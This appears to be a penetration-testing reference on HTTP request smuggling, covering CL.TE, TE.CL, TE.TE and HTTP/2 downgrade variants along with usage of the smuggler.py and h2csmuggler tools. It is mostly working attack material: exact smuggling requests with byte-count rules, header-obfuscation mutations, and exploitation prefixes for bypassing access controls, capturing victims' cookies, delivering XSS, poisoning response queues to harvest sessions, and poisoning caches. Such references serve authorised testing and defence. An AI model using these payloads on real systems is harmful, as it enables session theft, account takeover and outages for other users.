# Desync techniques in depth — CL.TE / TE.CL / TE.TE / H2 downgrade

RFC 9112 §6.3: if both `Transfer-Encoding: chunked` and `Content-Length` are present,
TE wins and CL must be ignored (or the message rejected). Smuggling exists because
real front-end/back-end pairs disagree: one honors CL, the other TE. Naming:
`<front-end>.<back-end>` — CL.TE means front-end uses Content-Length, back-end uses
Transfer-Encoding.

All byte counts below count `\r\n` as 2 bytes. Get the arithmetic wrong by one byte
and the probe silently fails — this is why you use `scripts/smuggle_probe.py` or
Burp Repeater with **Update Content-Length OFF** and `\r\n` shown.

## CL.TE

### Timing probe

```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Body on the wire: `1\r\nA\r\nX` (7 bytes). Front-end (CL=4) forwards exactly
`1\r\nA`. Back-end (TE) reads chunk-size `1`, data `A`, then **blocks** waiting for
the next chunk size that never comes => timeout-length delay. The trailing `X` never
leaves the front-end.

### Differential confirmation

Attack request:

```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 35

0

GET /404doesnotexist HTTP/1.1
X-Ignore: X
```

Wire body (35 bytes under CL): `0\r\n\r\nGET /404doesnotexist HTTP/1.1\r\nX-Ignore: X`
— adjust CL to the exact byte length of everything after the blank line. Back-end
(TE) sees the message end at `0\r\n\r\n` and leaves
`GET /404doesnotexist HTTP/1.1\r\nX-Ignore: X` on the socket as the start of the
*next* request. Because `X-Ignore: X` has no trailing CRLF, the follow-up request's
own request line is appended to it (`X-Ignore: XGET / HTTP/1.1`) and neutralized, so
the smuggled `GET /404doesnotexist` request line governs the response. Send a normal
`GET /` from a **fresh connection** within the keep-alive window: a 404 for `/`
confirms CL.TE. Repeat; connection pools randomize which connection your victim
request rides.

## TE.CL

### Timing probe

```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Front-end (TE) forwards through the terminating `0\r\n\r\n` (5 bytes) and drops `X`.
Back-end (CL=6) waits for a 6th byte => delay. **Run only after CL.TE probing was
clean** — against a CL.TE system this probe leaves `X` on the back-end socket and
breaks a real user's next request.

### Differential confirmation / attack shape

```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404doesnotexist HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Front-end (TE): one chunk of size `0x5e` containing the entire smuggled request, then
the `0` terminator. Back-end (CL=4) reads only `5e\r\n` and stops — everything from
`POST /404...` onward is the *next* request on that socket. The smuggled request's own
`Content-Length: 15` makes the back-end absorb the start of the victim's request as
its body. Rules:

- Outer `Content-Length` = bytes of the first chunk-size line + CRLF only (here
  `5e\r\n` = 4).
- The chunk size (hex!) must equal the exact byte length of the smuggled request block
  including its trailing `x=1\r\n`... up to but not including the `0` line. Recount
  after any edit. `smuggle_probe.py --probe confirm --variant tecl` does the math.
- Must end `0\r\n\r\n` so the front-end sees a complete chunked message.

## TE.TE — header obfuscation

Both ends honor TE; find a mutation only one of them recognizes, which collapses the
pair into CL.TE or TE.CL. Mutation set (what smuggler.py permutes; smuggle_probe.py
`--probe tete` emits them all):

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked      (bare-LF line ending)
Transfer-Encoding
: chunked                                (header folding)
Transfer-Encoding: chunk
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked, identity
Transfer-encoding: cow                   (duplicate after a valid one)
Transfer-Encoding:\x0bchunked            (vertical tab)
```

Pair each mutation with both the CL.TE and TE.CL timing probes; whichever direction
delays tells you which parser dropped the header.

## HTTP/2 downgrade — H2.CL and H2.TE

HTTP/2 frames carry explicit lengths; CL/TE are meaningless. Edges that *downgrade*
H2 to HTTP/1.1 for the origin re-serialize your headers — so an injected
`content-length: 0` (H2.CL) or `transfer-encoding: chunked` (H2.TE) that the edge
ignored becomes authoritative at the back-end:

- **H2.CL**: send H2 request with `content-length: 0` but a non-empty DATA body; the
  downgraded HTTP/1.1 request has CL=0, so the body becomes the next request.
- **H2.TE**: inject `transfer-encoding: chunked`; downgraded back-end parses your body
  as chunks — classic TE.CL shapes apply.
- **CRLF injection via H2**: H2 header values are binary-safe, so a value containing
  `\r\nX-Injected: 1` or even a full smuggled request survives into the downgraded
  HTTP/1.1 header block. Also works in the `:path`/`:method` pseudo-headers on sloppy
  edges (request-line injection).
- **Request tunnelling**: when the back-end connection is NOT reused across users,
  queue poisoning fails but you can still tunnel — smuggle a second request and read
  its response concatenated into yours (leaks internal headers the front-end appends;
  use a HEAD-with-content-length trick to expose it).

Tooling: Burp's HTTP Request Smuggler ("HTTP/2 probe"), Burp Repeater with
"Allow HTTP/2 ALPN override" and kettled requests. curl/python http.client normalize —
useless here.

## h2csmuggler

Targets edges that blindly proxy the `Upgrade: h2c` handshake. Once the back-end
upgrades, the TLS-terminating front-end treats the connection as an opaque tunnel —
all edge-layer auth/path rules stop applying.

```
python3 h2csmuggler.py -x https://example.com/ --test
python3 h2csmuggler.py -x https://example.com/ https://example.com/internal-api/users
python3 h2csmuggler.py -x https://example.com/ -i wordlist_paths.txt -t  # -t: test each
python3 h2csmuggler.py -x https://example.com/ -H 'Cookie: session=...' https://example.com/admin
```

`--test` output `h2c stream established` / `Success` => tunnel works. Then replay any
previously-403'd route through the tunnel and diff.

## Exploitation prefixes (drop into the confirmed CL.TE/TE.CL shape)

**Bypass front-end ACL:**

```
GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

**Capture victim requests** (unclosed parameter into stored content; make the inner
Content-Length larger than your own data so the victim's request fills it):

```
POST /post/comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=<your-session>

csrf=<token>&postId=5&name=x&email=a%40b.c&comment=
```

Read the comment back: it contains the victim's request line, headers, and Cookie.
Increase CL to capture more; too large and the back-end times out.

**Deliver reflected XSS to the next user:** smuggle a request to the vulnerable
endpoint with the payload in the reflected header/param; the poisoned response goes to
whoever's request lands next.

**Response-queue poisoning:** smuggle a *complete* request (ends with final CRLFCRLF,
balanced CL). Back-end now has one extra response queued; every subsequent user gets
the previous user's response. Harvest sessions by looping GETs and logging every
response that isn't yours. Severity: critical. This also breaks the site for everyone
on that pool — time-box it.

**Host-header + smuggling combo (web cache poisoning):** smuggle a request whose
response is a redirect/script reference to your host, timed so a cacheable URL's
request receives it => cache now serves your payload for the TTL.

## smuggler.py reference

```
python3 smuggler.py -u https://example.com            # single target
cat urls.txt | python3 smuggler.py                    # batch over stdin
python3 smuggler.py -u https://example.com -v 1 -l out.log -x
```

Output lines like `[+] [CL.TE] ... (tabprefix1)` name the mutation. The payloads it
used are dumped under `./payloads/` — replay the exact named mutation manually before
reporting. Timeout-based => expect false positives from slow origins; raise `-t` and
re-run twice; only consistent, mutation-specific delays count.
